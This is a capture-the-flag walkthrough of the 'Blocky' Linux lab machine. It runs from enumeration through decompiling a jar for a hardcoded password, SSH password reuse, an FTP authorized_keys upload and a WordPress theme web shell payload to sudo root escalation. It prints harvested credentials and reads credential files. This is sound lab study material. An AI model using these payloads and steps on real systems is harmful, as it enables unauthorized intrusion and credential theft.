# Blocky
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan & Website Enumeration | Identified open ports 21 (FTP), 22 (SSH), and 80 (HTTP). Discovered a WordPress site and the user `notch`. Found a `/plugins` directory containing two `.jar` files. |
| 2 | (Web) | Decompiling Java Files & Password Reuse | Decompiled the `BlockyCore.jar` file and found hardcoded MySQL credentials for the root user. The password from these credentials was reused to log in to the server via SSH as the user `notch`. |
| 3 | (Web) | Wordpress Theme Exploitation | (Alternative Path) Gained initial access by exploiting the FTP service to upload a public key. Found database credentials in `wp-config.php`, used them to compromise the WordPress admin account, and then uploaded a web shell by editing a theme file to get a shell as `www-data`. Discovered the `notch` password in a configuration file and used `su` to switch to that user. |
| 4 | notch -> root | `sudo` Abuse | After gaining a shell as `notch`, ran `sudo -l` and found that the user could run all commands as any user without a password. Used `sudo su -` to escalate privileges to the `root` user. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Nmap scan report for 10.10.10.37
Host is up (0.058s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: BlockyCraft &#8211; Under Construction!
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Given the initial scan, let's dig deeper into port 80.  
let's enumerate directories and see if we discover something intresting.
```
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/]
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.10.37/javascript/]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.10.37/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.10.37/phpmyadmin/]
/server-status        (Status: 403) [Size: 299]
```
Now, here's a rabbit hole that we can easilly jump straight in.  
As we can see there is a wordpress installed on this server, we can try to exploit wordpress but there are tons of exploit available to try. there is a much easier way.  
Before jump into the rabbit hole, as a practice, make sure to enumerate everything.  
Anyway enumerating wordpress show a user "notch".
```
[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
we can check if this user is also available for ssh login.  
To check this we can use the metasploit module ```scanner/ssh/ssh_enumusers``` and set the options as follows
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.10.10.37
RHOSTS => 10.10.10.37
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set username notch
username => notch
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 10.10.10.37:22 - SSH - Using malformed packet technique
[*] 10.10.10.37:22 - SSH - Starting scan
[+] 10.10.10.37:22 - SSH - User 'notch' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Now, let's go now to the /plugins directory.  
Here we can find two .jar files hosted: "BlockyCore.jar" and "griefprevention-1.11.2-3.1.1.298.jar".  
.jar file are nothing else but archives, to extract this archive we can use zip command.  
when we extract archives we can se .class file.  
To decompile class files we can use ```jad``` (or ```jd-gui``` with the UI) and here we get the .jad file with the code in a readable format
## User
### Method 1 - Class File Decompile and Password Reuse
Using jad, we can decompile ```BlockyCore.class``` and get the .jad file by simply running:
```
jad BlockyCore.class
```
as we can see, after opening the jad file we can se the following lines:
```
sqlHost = "localhost";
sqlUser = "root";
sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```
Now we can try to login as root/notch to the machine and see if we do get any luck.
```
[root@kali Blocky ]$ ssh $TARGET -l notch
notch@10.10.10.37's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$
```
Now we got user.

### Method 2 - Wordpress Theme Exploitation and Password Seek in Configuration Files
Let's suppose now that, for some reason this credential does not work with the ssh service and we can somehow exploit the ftp service.  
Now we can try to login to ftp, create a .ssh/ directory and upload our public key into .ssh/authorized_keys and login using our certificate.   
In order to do this we can establish the followig ftp session:
```
[root@kali Blocky ]$ ftp $TARGET
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:root): notch                  
331 Password required for notch
Password:
230 User notch logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mkdir .ssh
257 "/.ssh" - Directory successfully created
ftp> cd .ssh
250 CWD command successful
ftp> put id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
200 PORT command successful
150 Opening BINARY mode data connection for id_rsa.pub
226 Transfer complete
563 bytes sent in 0.00 secs (11.9315 MB/s)
ftp> rename id_rsa.pub authorized_keys
350 File or directory exists, ready for destination name
250 Rename successful
```
now we can login into ssh.  
As a general rule, in penetration testing, code that connects to database contains connection parameter and in this parameter set we will most likely have credentials.  
so lets navigate to /var/www/html and grep for the keyword "pass"
```
/** MySQL database password */
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
notch@Blocky:/var/www/html$ cat wp-config.php | grep DB_USER
define('DB_USER', 'wordpress');
```
As we can see we found the password for user wordpress.  
Let's dig deeper and see if we can get credentials for phpmyadmin.  
Finding credentials for mysql is quite important at this stage, because, if we do find credentials for root user, we can login to mysql cli and drop a shell as root using mysql as privilege escalation vector.  
Now let's navigate to ```/etc/phpmyadmin/```.  
We do not have permission for ```config-db.php``` file as it is owned by www-data. So, let's try to get a shell as user www-data.  
Now that we have user wordpress creds for the database, let's login to phpmyadmin using user wordpress and the disclosed password.  
Now we can navigate to wordpress database, find the ```wp_users``` table and create a new hash for user notch replacing the old one.  
Now we can login in wordpress using the user notch and the password used to generate the hash.  
Once we are logged in wordpress we can easilly obtain a shell by editing the theme files.  
If, for example, we go to Appearance > Editor > Theme Header, we can insert there a simple payload like : ```<?php system($_REQUEST['cmd']) ?>``` and obtain remote code execution and drop a shell as well.  
Once we are logged in as www-data we can read ```config-db.php```.  
As expected the file discloses credentials:
```
www-data@Blocky:/var/www/html$ cat /etc/phpmyadmin/config-db.php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='8YsqfCTnvxAUeduzjNSXe22';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='';
$dbtype='mysql';
```
Now using this credentials we can try to escalate to another user and as we can see we can successfully escalate to "notch"
```
www-data@Blocky:/var/www/html$ su - notch
Password:
notch@Blocky:/var/www/html$
```

## Root
Now that we got user, first thing first let's check if we do have any sudo capability on this box:
```
notch@Blocky:~$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
Sudo asks for password, but as we are logged in using a password, we can provide the password and retrive sudo capabilities list.
Given the sudo permission, we can easilly escalate to root by simply doing:
```
notch@Blocky:~$ sudo su -
root@Blocky:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Blocky:~#
```
